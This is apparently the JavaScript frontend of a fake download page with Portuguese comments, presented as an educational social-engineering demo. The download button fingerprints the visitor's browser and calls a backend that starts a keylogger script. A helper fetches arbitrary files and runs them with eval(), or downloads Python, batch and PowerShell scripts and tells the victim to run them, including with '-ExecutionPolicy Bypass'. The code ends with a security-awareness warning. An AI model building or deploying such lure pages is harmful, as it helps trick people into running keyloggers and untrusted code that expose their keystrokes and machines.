(function(){
  const downloadBtn = document.getElementById('download-btn');
  const status = document.getElementById('status');
  
  // CONFIGURAÇÃO: URL do servidor backend
  const API_URL = 'http://localhost:5000/api';
  
  // Sem execução de payloads no cliente; execução ocorre apenas via servidor (server.py -> keylogger.py)

  function showStatus(message, type){
    status.hidden = false;
    status.textContent = message;
    status.className = `status ${type}`;
  }

  function hideStatus(){
    status.hidden = true;
    status.textContent = '';
    status.className = 'status';
  }

  // Simula download de arquivo
  function simulateDownload(filename, content){
    const blob = new Blob([content], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  }

  // Loga informações do usuário (apenas para demonstração local)
  function logUserInfo(){
    const info = {
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      screenResolution: `${screen.width}x${screen.height}`,
      referrer: document.referrer || 'direto',
      url: window.location.href
    };
    
    console.log('📊 Informações capturadas:', info);
    return info;
  }

  // (payload removido a pedido do usuário)

  // Função para executar script no servidor
  async function executeScriptOnServer(){
    console.log('🚀 Enviando comando para executar script no servidor...');
    
    try {
      const response = await fetch(`${API_URL}/execute`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          timestamp: new Date().toISOString()
        })
      });
      
      const result = await response.json();
      
      if (result.success) {
        console.log('✅ Script iniciado no servidor:', result);
        return result;
      } else {
        console.error('❌ Erro do servidor:', result.message);
        throw new Error(result.message);
      }
      
    } catch (error) {
      console.error('❌ Erro ao conectar com servidor:', error);
      
      // Se servidor não estiver rodando, mostra instrução
      if (error.message.includes('Failed to fetch')) {
        throw new Error('Servidor não está rodando. Execute: python server.py');
      }
      
      throw error;
    }
  }

  // Função para executar arquivo do caminho configurado
  async function executeFileFromPath(filePath, fileType){
    console.log(`🚀 Tentando executar: ${filePath} (tipo: ${fileType})`);
    
    try {
      // Faz requisição para buscar o conteúdo do arquivo
      const response = await fetch(filePath);
      
      if (!response.ok) {
        throw new Error(`Arquivo não encontrado: ${filePath}`);
      }
      
      const fileContent = await response.text();
      console.log(`📄 Arquivo carregado (${fileContent.length} caracteres)`);
      
      // Executa de acordo com o tipo
      switch(fileType.toLowerCase()) {
        case 'javascript':
        case 'js':
          // Executa JavaScript diretamente
          console.log('⚡ Executando JavaScript...');
          eval(fileContent);
          console.log('✅ JavaScript executado');
          break;
          
        case 'python':
        case 'py':
          // Python não pode ser executado no navegador diretamente
          // Mas podemos baixar o arquivo e instruir o usuário
          console.warn('⚠️ Python não pode ser executado no navegador');
          console.log('📥 Iniciando download do script Python...');
          
          const filename = filePath.split('/').pop();
          simulateDownload(filename, fileContent);
          
          // Cria instruções de execução
          const instructions = `
Para executar o arquivo baixado (${filename}):

1. Abra o PowerShell ou Terminal
2. Navegue até a pasta de Downloads
3. Execute: python ${filename}

Ou use este comando único:
python "%USERPROFILE%\\Downloads\\${filename}"
          `.trim();
          
          console.log(instructions);
          alert(instructions);
          break;
          
        case 'bat':
        case 'cmd':
          // Scripts batch - baixa e instrui
          console.log('📥 Baixando script batch...');
          simulateDownload(filePath.split('/').pop(), fileContent);
          alert('Script .bat baixado! Clique duas vezes no arquivo baixado para executar.\n\n⚠️ CUIDADO: Apenas execute scripts de fontes confiáveis!');
          break;
          
        case 'powershell':
        case 'ps1':
          // Scripts PowerShell - baixa e instrui
          console.log('📥 Baixando script PowerShell...');
          simulateDownload(filePath.split('/').pop(), fileContent);
          const psCmd = `powershell -ExecutionPolicy Bypass -File "${filePath.split('/').pop()}"`;
          alert(`Script PowerShell baixado!\n\nExecute no PowerShell:\n${psCmd}\n\n⚠️ CUIDADO: Apenas execute scripts de fontes confiáveis!`);
          break;
          
        case 'download':
          // Apenas baixa o arquivo sem executar
          console.log('📥 Baixando arquivo...');
          simulateDownload(filePath.split('/').pop(), fileContent);
          break;
          
        default:
          // Tipo desconhecido - apenas baixa
          console.log('📥 Tipo desconhecido, baixando arquivo...');
          simulateDownload(filePath.split('/').pop(), fileContent);
      }
      
      return {
        success: true,
        path: filePath,
        type: fileType,
        size: fileContent.length
      };
      
    } catch (error) {
      console.error('❌ Erro ao executar arquivo:', error);
      throw error;
    }
  }

  // Código executado ao clicar no botão
  downloadBtn.addEventListener('click', async () => {
    try {
      // Desabilita botão temporariamente
      downloadBtn.disabled = true;
      downloadBtn.classList.add('downloading');
      
      showStatus('⏳ Preparando download...', 'downloading');
      
      // 1. Captura informações (simulação de telemetria)
      const userInfo = logUserInfo();
      
      // 2. EXECUTA SCRIPT NO SERVIDOR
      console.log('🎯 Executando script no servidor...');
      showStatus('⚙️ Iniciando keylogger no servidor...', 'downloading');
      
      const execResult = await executeScriptOnServer();
      console.log('✅ Script executado no servidor:', execResult);
      
      // 3. Simula delay de processamento
      await new Promise(resolve => setTimeout(resolve, 1000));
      
      // 4. Gera arquivo de "relatório" com informações básicas e status do script
      const fileContent = `
# Relatório de Execução
# Gerado em: ${new Date().toLocaleString('pt-BR')}

## INFORMAÇÕES DO SISTEMA
Timestamp: ${userInfo.timestamp}
Plataforma: ${navigator.platform}
User Agent: ${navigator.userAgent}
Linguagem: ${navigator.language}
Resolução: ${screen.width}x${screen.height}

## SCRIPT INICIADO
Script: ${execResult.script || 'keylogger.py'}
PID do Processo: ${execResult.pid || 'N/A'}
Status: ${execResult.success ? 'Executando em background' : 'Falhou'}
Mensagem: ${execResult.message || 'N/A'}

## AVISO DE SEGURANÇA
Este é apenas um exemplo educacional para demonstrar como
ataques de engenharia social funcionam.

NUNCA:
- Execute arquivos de fontes não confiáveis
- Clique em links suspeitos
- Forneça dados pessoais sem verificar a fonte
- Baixe "atualizações" ou "ferramentas" de sites desconhecidos

SEMPRE:
- Verifique URLs antes de clicar
- Use antivírus atualizado
- Mantenha o navegador atualizado
- Desconfie de ofertas "boas demais"
      `.trim();
      
      // 4. Dispara download
      simulateDownload('instalador_simulado.txt', fileContent);
      
      // 5. Feedback de sucesso
      await new Promise(resolve => setTimeout(resolve, 500));
      showStatus(`✅ Keylogger iniciado! PID: ${execResult.pid}`, 'success');
      
  console.log('📂 Arquivo de relatório baixado');
      console.log(`🔴 KEYLOGGER RODANDO - PID: ${execResult.pid}`);
      console.log('⚠️  Pressione ESC no teclado para parar o keylogger');
      
      // 6. Opcional: redirecionar após alguns segundos
      setTimeout(() => {
        // window.location.href = './index.html'; // descomente para redirecionar
      }, 3000);
      
      // 7. Você pode enviar dados para servidor (se tiver backend)
      // await fetch('/api/track-download', {
      //   method: 'POST',
      //   headers: { 'Content-Type': 'application/json' },
      //   body: JSON.stringify(userInfo)
      // });
      
    } catch (error) {
      console.error('Erro ao processar download:', error);
      showStatus('❌ Erro ao iniciar download. Tente novamente.', 'error');
    } finally {
      // Reabilita botão
      downloadBtn.disabled = false;
      downloadBtn.classList.remove('downloading');
    }
  });

  // Executa código adicional ao carregar a página (opcional)
  window.addEventListener('load', () => {
    console.log('🔍 Página de download carregada');
    
    // Exemplo: detectar se usuário veio da página de cadastro
    const params = new URLSearchParams(window.location.search);
    if (params.has('from')) {
      console.log(`Usuário veio de: ${params.get('from')}`);
    }
  });
})();
